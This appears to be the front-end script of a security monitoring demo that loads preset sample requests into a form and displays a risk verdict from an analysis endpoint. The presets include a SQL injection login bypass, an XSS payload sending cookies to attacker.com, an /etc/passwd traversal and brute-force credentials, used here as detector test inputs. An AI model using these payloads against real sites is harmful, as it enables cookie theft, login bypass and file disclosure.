// ZeroAttack Live Monitor JavaScript
const presets = {
  sqli: {
    ip: "198.51.100.77",
    method: "POST",
    url: "/api/v1/auth/login",
    params: "username=admin' OR '1'='1&password=dummy",
    agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    freq: 3
  },
  xss: {
    ip: "203.0.113.45",
    method: "POST",
    url: "/comments/new",
    params: "comment=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
    agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    freq: 2
  },
  traversal: {
    ip: "192.0.2.14",
    method: "GET",
    url: "/download?file=../../../../etc/passwd",
    params: "file=../../../../etc/passwd",
    agent: "curl/7.68.0",
    freq: 5
  },
  bruteforce: {
    ip: "198.51.100.99",
    method: "POST",
    url: "/login",
    params: "user=root&pass=toor",
    agent: "Python-urllib/3.8",
    freq: 48
  },
  normal: {
    ip: "192.168.1.105",
    method: "GET",
    url: "/products?category=electronics&page=2",
    params: "category=electronics&page=2",
    agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
    freq: 4
  }
};

function loadPreset(key) {
  const p = presets[key];
  if (!p) return;
  document.getElementById("req-ip").value = p.ip;
  document.getElementById("req-method").value = p.method;
  document.getElementById("req-url").value = p.url;
  document.getElementById("req-params").value = p.params;
  document.getElementById("req-agent").value = p.agent;
  document.getElementById("req-frequency").value = p.freq;
}

document.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById("inspection-form");
  if (!form) return;

  form.addEventListener("submit", async (e) => {
    e.preventDefault();
    const resultPanel = document.getElementById("result-content");
    resultPanel.innerHTML = `<div class="p-6 text-center text-cyan-400">Inspecting request packets across rule and anomaly engines...</div>`;

    const payload = {
      source_ip: document.getElementById("req-ip").value,
      method: document.getElementById("req-method").value,
      url: document.getElementById("req-url").value,
      parameters: document.getElementById("req-params").value,
      user_agent: document.getElementById("req-agent").value,
      frequency: parseInt(document.getElementById("req-frequency").value, 10)
    };

    try {
      const res = await fetch("/api/events/analyze", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
      const data = await res.json();

      let sevClass = "text-emerald-400";
      if (data.severity === "CRITICAL") sevClass = "text-rose-500 font-bold";
      else if (data.severity === "HIGH") sevClass = "text-orange-400 font-bold";
      else if (data.severity === "MEDIUM") sevClass = "text-amber-400";

      resultPanel.innerHTML = `
        <div class="space-y-4">
          <div class="flex items-center justify-between p-3 bg-slate-950 border border-slate-800 rounded">
            <div>
              <span class="text-slate-400">Composite Risk Score</span>
              <div class="text-2xl font-bold ${sevClass}">${data.risk_score} / 100</div>
            </div>
            <div class="text-right">
              <span class="text-slate-400">Severity</span>
              <div class="text-sm ${sevClass}">${data.severity}</div>
            </div>
            <div class="text-right">
              <span class="text-slate-400">Action Taken</span>
              <div class="text-sm text-cyan-400 font-semibold">${data.action_taken}</div>
            </div>
          </div>

          <div>
            <span class="text-slate-400 font-semibold block mb-1">Detected Attack Vector:</span>
            <div class="text-white">${data.attack_type} (${data.detection_method})</div>
          </div>

          <div>
            <span class="text-slate-400 font-semibold block mb-1">Detection Logic & Evidence:</span>
            <div class="p-2.5 bg-slate-950 border border-slate-800 rounded text-slate-300">
              ${data.detection_reason}
            </div>
          </div>

          <div>
            <span class="text-slate-400 font-semibold block mb-1">Encrypted Security Record (AES-256-GCM):</span>
            <div class="p-2.5 bg-slate-950 border border-slate-800 rounded font-mono text-[11px] text-cyan-300/80 break-all">
              ${data.cipher_preview || 'ENCRYPTED_RECORD_PERSISTED'}
            </div>
          </div>

          ${data.mitigation_applied ? `
            <div class="p-3 bg-rose-950/40 border border-rose-800 rounded text-rose-300 flex items-center gap-2">
              <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/></svg>
              <span>Automated IPS Triggered: Source IP ${data.source_ip} placed under 30-minute quarantine.</span>
            </div>
          ` : ''}

          <div class="flex justify-end pt-2">
            <a href="/events/${data.event_id}" class="text-xs text-cyan-400 hover:underline">
              Inspect Forensic Record & Decrypt &rarr;
            </a>
          </div>
        </div>
      `;
    } catch (err) {
      resultPanel.innerHTML = `<div class="p-4 text-rose-400">Analysis failed: ${err.message}</div>`;
    }
  });
});
